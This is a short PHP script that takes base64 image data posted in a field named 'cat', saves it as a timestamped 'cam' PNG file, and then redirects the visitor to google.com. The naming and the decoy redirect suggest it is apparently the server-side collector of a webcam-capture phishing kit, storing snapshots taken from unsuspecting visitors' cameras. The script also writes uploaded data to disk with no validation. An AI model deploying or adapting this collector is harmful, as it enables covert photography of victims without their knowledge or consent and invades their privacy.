<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
header('Location: https://google.com');
exit();
?>

